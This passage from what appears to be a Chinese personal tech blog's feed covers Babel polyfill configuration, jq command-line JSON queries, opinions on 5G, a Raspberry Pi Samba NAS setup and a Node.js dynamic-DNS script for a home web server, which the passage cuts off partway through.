class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;plugins&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line"><span class="punctuation">[</span></span><br><span class="line"><span class="string">&quot;@babel/plugin-transform-runtime&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;corejs&quot;</span><span class="punctuation">:</span> <span class="number">3</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>一般情况下不需要，需要配置 <code>@babel/runtime</code>（不是<strong>开发依赖</strong>） 一起使用。使用了这个后能复用一些<code>helpers</code>代码，能避免污染全局。下面是打开使用这个插件后的转义代码：</p><p>我们看到 <code>Map</code> 和 <code>Object.assign</code> 不在是全局的了</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> _interopRequireDefault = <span class="built_in">require</span>(<span class="string">&quot;@babel/runtime-corejs3/helpers/interopRequireDefault&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> _map = <span class="title function_">_interopRequireDefault</span>(<span class="built_in">require</span>(<span class="string">&quot;@babel/runtime-corejs3/core-js-stable/map&quot;</span>));</span><br><span class="line"><span class="keyword">var</span> _assign = <span class="title function_">_interopRequireDefault</span>(<span class="built_in">require</span>(<span class="string">&quot;@babel/runtime-corejs3/core-js-stable/object/assign&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> foo = &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&#x27;Ming&#x27;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> bar = &#123;</span><br><span class="line">  <span class="attr">address</span>: <span class="string">&#x27;Beijing&#x27;</span>,</span><br><span class="line">  <span class="attr">age</span>: <span class="string">&#x27;18&#x27;</span></span><br><span class="line">&#125;;</span><br><span class="line">(<span class="number">0</span>, _assign.<span class="property">default</span>)(foo, bar);</span><br><span class="line"><span class="keyword">var</span> map = <span class="keyword">new</span> _map.<span class="title function_">default</span>();</span><br></pre></td></tr></table></figure><h3 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h3><ul><li>配合<code>webpack</code>的 <code>splitChunks</code> 将 <code>polyfill</code> 打包到一个文件中</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">optimization</span>: &#123;</span><br><span class="line"><span class="attr">splitChunks</span>: &#123;</span><br><span class="line"><span class="comment">// cacheGroups 指定拆分规则 默认的拆分规则如下 &lt;https://webpack.js.org/plugins/split-chunks-plugin/#optimizationsplitchunks&gt;</span></span><br><span class="line"><span class="attr">cacheGroups</span>: &#123;</span><br><span class="line"><span class="attr">polyfill</span>: &#123;</span><br><span class="line"><span class="comment">// 一个正则匹配那些代码适用这个规则</span></span><br><span class="line"><span class="attr">test</span>: <span class="regexp">/core-js/</span>, </span><br><span class="line"><span class="comment">// 表示从哪些chunks里面抽取代码，除了三个可选字符串值 initial、async、all 之外，还可以通过函数来过滤所需的 chunks</span></span><br><span class="line"><span class="attr">chunks</span>: <span class="string">&#x27;all&#x27;</span> </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="https://www.babeljs.cn/docs/babel-preset-env">@babel&#x2F;preset-env</a></li><li><a href="https://www.babeljs.cn/docs/babel-polyfill">@babel&#x2F;polyfill</a></li><li><a href="https://www.babeljs.cn/docs/babel-plugin-transform-runtime">@babel&#x2F;plugin-transform-runtime</a></li><li><a href="https://webpack.js.org/plugins/split-chunks-plugin/#splitchunkschunks">SplitChunksPlugin</a></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>jq</title>
      <link href="/post/jq.html"/>
      <url>/post/jq.html</url>
      
        <content type="html"><![CDATA[<h2 id="JQ"><a href="#JQ" class="headerlink" title="JQ"></a>JQ</h2><p>jq 是个非常强大的处理 JSON 数据的命令行工具。</p><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><ul><li><p>Linux</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install jq</span><br></pre></td></tr></table></figure></li><li><p>macOS</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew install jq</span><br></pre></td></tr></table></figure></li></ul><h3 id="使用示例"><a href="#使用示例" class="headerlink" title="使用示例"></a>使用示例</h3><blockquote><p>注意：示例数据不是一段json数据，它的每一行都是一条json数据。每一行都会处理一次。</p></blockquote><ol><li>格式化</li></ol><blockquote><p>这里的 <code>.</code> 表示当前JSON对象</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s https://kekek.cc/static/jq.json | jq .</span><br></pre></td></tr></table></figure><ol start="2"><li>查询</li></ol><blockquote><p>查询 <code>remote_addr</code> 为 <code>187.141.142.230</code> 的用户</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s https://kekek.cc/static/jq.json | jq <span class="string">&#x27;select (.[&quot;remote_addr&quot;] == &quot;187.141.142.230&quot;)&#x27;</span></span><br></pre></td></tr></table></figure><p><code>select(boolean_expression)</code> 为查询语句，<code>.[&quot;remote_addr&quot;]</code> 表示取对象的<code>remote_addr</code>属性（除了可以用<code>.[]</code>取值还可以直接<code>.</code>取值，前者可以处理特殊字符的情况）。 <code>==</code> 表示等于。</p><blockquote><p>查询 <code>method</code> 为 <code>GET</code> 的请求，并且<code>status</code> 为 <code>200</code></p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s https://kekek.cc/static/jq.json | jq <span class="string">&#x27;select (.[&quot;method&quot;] == &quot;GET&quot; and .status == 200)&#x27;</span></span><br></pre></td></tr></table></figure><ol start="3"><li>管道</li></ol><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title class_">AccessLog</span> &#123;</span><br><span class="line"><span class="attr">ip</span>: <span class="built_in">string</span>;</span><br><span class="line"><span class="attr">method</span>: <span class="built_in">string</span>;</span><br><span class="line"><span class="attr">url</span>: <span class="built_in">string</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s https://kekek.cc/static/jq.json | jq <span class="string">&#x27;. | &#123;ip: .[&quot;remote_addr&quot;], method: .method, url: .[&quot;request_uri&quot;]&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>这里使用了管道符 <code>|</code> 可以多次处理结果</p><ol start="4"><li>输出csv格式</li></ol><blockquote><p>csv 的输入要求必须是一个数组</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s https://kekek.cc/static/jq.json | jq <span class="string">&#x27;. | [.[&quot;remote_addr&quot;], .method, .status]] | @csv&#x27;</span></span><br></pre></td></tr></table></figure><ol start="5"><li>数组</li></ol><p><code>.[]</code> 表示取整个数组，一般配合管道符号一起使用 <code>.[] | {ip: .[&quot;remote_addr&quot;], method: .method, url: .[&quot;request_uri&quot;]}</code></p><p><code>.[0]</code> 表示取数组的第一个元素</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="https://stedolan.github.io/jq/tutorial/">Tutorial</a></li><li><a href="https://stedolan.github.io/jq/manual/">jq Manual</a></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>对5G的一些看法</title>
      <link href="/post/5G.html"/>
      <url>/post/5G.html</url>
      
        <content type="html"><![CDATA[<h2 id="对5G的一些看法"><a href="#对5G的一些看法" class="headerlink" title="对5G的一些看法"></a>对5G的一些看法</h2><p>5G（5th-Generation）是第五代<strong>移动</strong>通信技术的意思，相比4G它有更低的延时和更快的速度。</p><ol><li><p>低延时</p><p> 我们常听到5G可以把延时降低到<code>1ms</code>，这句话很有误导性。会让大部分人觉得端到端的延迟在5G时代只有<code>1ms</code>了，这其实是不准确的。这个<code>1ms</code>其实指的是从设备到<code>5G</code>基站的延时，并不是端到端的延时。换个角度想，<code>5G</code>基站还是要通过光纤网络接入互联网的，那么它就不可能比光纤延时更低了。现在光纤网络的延时通常远远大于<code>1ms</code>，这主要取决于距离。</p></li><li><p>更快的速度</p><p> 移动网络速度每一代都比上一代有很大的提升。最新在网络上看到的一些测试，在<code>5G</code>网络中下载速度能到达<code>900Mbps</code>，约为<code>110MB/s</code>左右。</p></li></ol><h3 id="5G带来的影响"><a href="#5G带来的影响" class="headerlink" title="5G带来的影响"></a>5G带来的影响</h3><p>我们先看下网上常说的5G对未来生活的影响，来一一分析一下。</p><ol><li><p>万物互联</p><p> 我觉得这主要这主要得益于5G后整体带宽的提升，各种设备要传输大量的数据。低延时对于这方面的提升并不会明显。伴随着万物互联IPV6可能会迎来发展。现有网络环境下我们通过<code>NAT</code>技术缓解了<code>IPV4</code>不够用的问题，这也导致了<code>IPV6</code>这么多年来发展十分缓慢。在<code>5G</code>时代可能会有更多的设备，传感器通过<code>5G</code>网络接入互联网，那就需要大量IP了。</p></li><li><p>自动驾驶</p><p> <code>5G</code>对于自动驾驶的影响可能不是特别大，自动驾驶并不是将数据传输到服务器计算的，它是本地计算的。自动驾驶更大的难点可能还是现有道路规则都是为有人驾驶设计的，自动驾驶只能去适应现有规则。有了更高的网速，在道路上停留一个多小时下载更新包的尴尬情况起码不会再出现了╮(╯_╰)╭ 但是如果汽车间以后要互相通信，那么低延时技术可能会有帮助。</p></li><li><p>远程医疗</p><p> 我觉得<code>5G</code>对于远程医疗的影响我觉得极其有限。远程医疗非常依赖于低延时，但是5G在低延时和稳定性方面都不会比直接使用光纤网络更好。手术设备完全可以接入现有光纤网络，通过5G接入完全是没有必要的。有人说对于偏远地区光纤不好铺设，这时候使用5G就很方便了。这种观点其实也有问题，5G网络的覆盖非常小。只有几百米。也就是说我们能搜索到5G信号的地方都最近的光纤网络也只有几百米。</p></li><li><p>云</p><p> 云存储会迎来大发展。<code>5G</code>时代如果我们下载速度能达到<code>100+MB/s</code>，<code>iCloud</code>类的服务将会迎来更大发展。我们的设备完全没必要很大的存储了，我们不需要把数据都存在本地。128G、256G甚至更大容量的手机可能会很少了。</p><p> 云操作系统、云游戏可能会迎来发展的机会。对于延时不高的操作完全可以再云服务器上完成，我们的设备不在需要强大的硬件。Chromebook类似的设备和Google Stadia类似的云游戏平台可能会有更多。</p></li></ol><p>我觉得5G对我们影响最大的还是更快的网速，这将极大提升效率，为我们生活带来更多的便利。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>家用NAS搭建</title>
      <link href="/post/network-attached-storage.html"/>
      <url>/post/network-attached-storage.html</url>
      
        <content type="html"><![CDATA[<h2 id="家用NAS搭建"><a href="#家用NAS搭建" class="headerlink" title="家用NAS搭建"></a>家用NAS搭建</h2><p>手里有一个树莓派，刚好有几张闲置的SD卡。闲来没事搭建个<code>NAS</code>（Network Attached Storage）服务。使用树莓派搭建<code>NAS</code>服务优点就是省电，缺点是网卡有点差。</p><h3 id="部署及配置"><a href="#部署及配置" class="headerlink" title="部署及配置"></a>部署及配置</h3><ol><li><p>安装<code>samba</code></p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">apt-get install samba samba-common-bin</span></span><br></pre></td></tr></table></figure></li><li><p>配置</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">vim /etc/samba/smb.conf</span></span><br></pre></td></tr></table></figure><p> 找到<code>Share Definitions</code>部分在后面配置共享目录</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># [共享名] </span><br><span class="line">[ytdl]</span><br><span class="line">    comment = share # 共享描述</span><br><span class="line">    path = /data/share/  # 共享目录</span><br><span class="line">    valid users = pi # 允许访问该共享的用户 多个用户逗号分隔</span><br><span class="line">    browseable = yes # 该指定共享目录可浏览</span><br><span class="line">    public = no # 允许guest用户访问</span><br><span class="line">    writable = yes # 允许可写</span><br></pre></td></tr></table></figure><blockquote><p>配置完成重启服务器即可</p></blockquote></li><li><p>添加用户</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ smbpasswd -a [user]</span><br></pre></td></tr></table></figure><blockquote><p>根据提示输入密码即可</p></blockquote></li><li><p>启动和停止</p><ul><li>启动：&#x2F;etc&#x2F;init.d&#x2F;samba restart</li><li>停止：&#x2F;etc&#x2F;init.d&#x2F;samba stop</li><li>重启：&#x2F;etc&#x2F;init.d&#x2F;samba restart</li><li>重新加载配置文件：&#x2F;etc&#x2F;init.d&#x2F;samba reload</li></ul></li></ol><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="https://www.jianshu.com/p/ead92b06318e">在树莓派上安装Samba实现树莓派与Windows间的文件共享</a></li><li><a href="https://blog.csdn.net/weixin_40806910/article/details/81917077">Linux samba的配置和使用</a></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>在家庭宽带部署Web服务器</title>
      <link href="/post/deploy-web-server-on-home-broadband.html"/>
      <url>/post/deploy-web-server-on-home-broadband.html</url>
      
        <content type="html"><![CDATA[<h2 id="在家庭宽带部署Web服务器"><a href="#在家庭宽带部署Web服务器" class="headerlink" title="在家庭宽带部署Web服务器"></a>在家庭宽带部署Web服务器</h2><h3 id="端口映射"><a href="#端口映射" class="headerlink" title="端口映射"></a>端口映射</h3><p>局域网到公网要经过一层net地址转换，在路由器中有一张表记录着：</p><table><thead><tr><th>内网端口</th><th>服务器IP</th><th>服务器端口</th></tr></thead><tbody><tr><td>80</td><td>192.168.1.10</td><td>80</td></tr></tbody></table><p>我们要搭建Web服务器就需要把80端口配置到这张表中，</p><blockquote><p>注意：北京地区家庭宽带80端口被封，可以使用HTTPS443端口。</p></blockquote><p>随着这些年宽带提速以及各种直播类的需求现在家庭宽带上行速度已经不是问题。</p><h3 id="动态域名解析"><a href="#动态域名解析" class="headerlink" title="动态域名解析"></a>动态域名解析</h3><p>家庭宽带有个特点不是固定IP，每次重新拨号就会分配一个新的IP。这就要使用动态域名解析服务了，像花生壳之类的软件。我们也可以基于阿里云提供的<a href="https://help.aliyun.com/document_detail/29739.html">DNS API</a>自己来实现这个功能：</p><figure class="highlight js"><figcaption><span>ddns.js</span><a href="/downloads/code/ddns.js">view raw</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/env node</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> url = <span class="built_in">require</span>(<span class="string">&#x27;url&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> http = <span class="built_in">require</span>(<span class="string">&#x27;http&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> https = <span class="built_in">require</span>(<span class="string">&#x27;https&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">&#x27;crypto&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> stringCompare = <span class="title class_">String</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">localeCompare</span>;</span><br><span class="line"><span class="keyword">const</span> padStart = <span class="title class_">String</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">padStart</span>;</span><br><span class="line"><span class="keyword">const</span> padEnd = <span class="title class_">String</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">padEnd</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// accesskeys 访问&lt;https://ram.console.aliyun.com/#/user/list&gt;申请</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">ACCESS_KEY_ID</span> = <span class="string">&#x27;YOUR_ACCESS_KEY_ID&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">ACCESS_KEY_SECRET</span> = <span class="string">&#x27;YOUR_ACCESS_KEY_SECRET&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 比较字符串</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * String.prototype.localeCompare 算法有问题 AA &gt; Aa </span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> {<span class="type">*</span>} <span class="variable">str1</span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> {<span class="type">*</span>} <span class="variable">str2</span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@returns</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">compareString</span>(<span class="params">str1, str2</span>) {</span><br><span class="line">    <span class="keyword">const</span> len1 = str1.<span class="property">length</span>;</span><br><span class="line">    <span class="keyword">const</span> len2 = str2.<span class="property">length</span>;</span><br><span class="line">    <span class="keyword">const</span> lim = <span class="title class_">Math</span>.<span class="title function_">min</span>(len1, len2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> str1codes = str1.<span class="title function_">split</span>(<span class="string">&#x27;&#x27;</span>).<span class="title function_">map</span>(<span class="function"><span class="params">char</span> =&gt;</span> char.<span class="title function_">codePointAt</span>(<span class="number">0</span>));</span><br><span class="line">    <span class="keyword">const</span> str2codes = str2.<span class="title function_">split</span>(<span class="string">&#x27;&#x27;</span>).<span class="title function_">map</span>(<span class="function"><span class="params">char</span> =&gt;</span> char.<span class="title function_">codePointAt</span>(<span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> k = <span class="number">0</span>, c1, c2;</span><br><span class="line">    <span class="keyword">while</span> (k &lt; lim) {</span><br><span class="line">        c1 = str1codes[k];</span><br><span class="line">        c2 = str2codes[k];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (c1 !== c2) {</span><br><span class="line">            <span class="keyword">return</span> c1 - c2;</span><br><span class="line">        }</span><br><span class="line">        k++;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> len1 - len2;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">sha1</span>(<span class="params">str, key</span>) {</span><br><span class="line">    <span class="keyword">return</span> crypto.<span class="title function_">createHmac</span>(<span class="string">&#x27;sha1&#x27;</span>, key)</span><br><span class="line">        .<span class="title function_">update</span>(str)</span><br><span class="line">        .<span class="title function_">digest</span>()</span><br><span class="line">        .<span class="title function_">toString</span>(<span class="string">&#x27;base64&#x27;</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 获取时间字符串 YYYY-MM-DDTHH:mm:ssZ</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> {<span class="type">*</span>} <span class="variable">date</span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@returns</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">utcDateFormat</span>(<span class="params">time</span>) {</span><br><span class="line">    <span class="comment">// YYYY-MM-DDTHH:mm:ss.sssZ include milliseconds</span></span><br><span class="line">    <span class="comment">// return time.toISOString().match(/^(\d{4}\-\d{2}\-\d{2}T\d{2}:\d{2}:\d{2})/)[1] + &#x27;Z&#x27;;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> year = time.<span class="title function_">getUTCFullYear</span>();</span><br><span class="line">    <span class="keyword">const</span> month = padStart.<span class="title function_">call</span>(time.<span class="title function_">getUTCMonth</span>() + <span class="number">1</span>, <span class="number">2</span>, <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">    <span class="keyword">const</span> date = padStart.<span class="title function_">call</span>(time.<span class="title function_">getUTCDate</span>(), <span class="number">2</span>, <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">    <span class="keyword">const</span> hours = padStart.<span class="title function_">call</span>(time.<span class="title function_">getUTCHours</span>(), <span class="number">2</span>, <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">    <span class="keyword">const</span> minutes = padStart.<span class="title function_">call</span>(time.<span class="title function_">getUTCMinutes</span>(), <span class="number">2</span>, <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">    <span class="keyword">const</span> secounds = padStart.<span class="title function_">call</span>(time.<span class="title function_">getUTCSeconds</span>(), <span class="number">2</span>, <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">`<span class="subst">${year}</span>-<span class="subst">${month}</span>-<span class="subst">${date}</span>T<span class="subst">${hours}</span>:<span class="subst">${minutes}</span>:<span class="subst">${secounds}</span>Z`</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 字符串编码（阿里规则）</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> 